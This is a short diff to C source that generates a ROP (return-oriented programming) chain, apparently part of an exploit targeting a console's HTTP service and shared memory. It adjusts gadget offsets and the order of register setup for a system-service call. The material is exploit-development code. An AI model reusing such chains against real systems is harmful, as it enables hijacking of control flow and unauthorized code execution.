@@ -381,10 +381,10 @@ void ropgen_sharedmem_create(u32 **ropchain, u32 *http_ropvaddr, u32 ctx, u32 ad
 
 void ropgen_svcSendSyncRequest(u32 **ropchain, u32 *http_ropvaddr, u32 handle_addr)
 {
-	ropgen_copyu32(ropchain, http_ropvaddr, ropheap+0x0, (*http_ropvaddr) + 0x40 + 0x4, 0x3);//Copy the cmdbuf ptr to the r4 value used below with ropgen_setr4.
+	ropgen_copyu32(ropchain, http_ropvaddr, ropheap+0x0, (*http_ropvaddr) + 0x40 + 0x10 + 0x4, 0x3);//Copy the cmdbuf ptr to the r4 value used below with ropgen_setr4.
+	ropgen_setr0(ropchain, http_ropvaddr, handle_addr);
 	ropgen_setr4(ropchain, http_ropvaddr, 0);
 
-	ropgen_setr0(ropchain, http_ropvaddr, handle_addr);
 	ropgen_addword(ropchain, http_ropvaddr, ROP_svc32);
 	ropgen_addword(ropchain, http_ropvaddr, 0);//r4
 }
@@ -1412,7 +1412,9 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		ropvaddr0 = ropvaddr;
 		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
-			ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc0, ropvaddr + 0x40 + 0x20 + 0x4, 0x3);
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0xc0, 1);
+			ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+			ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x4, 1);
 
 			ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x10, 1);
 			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 1);
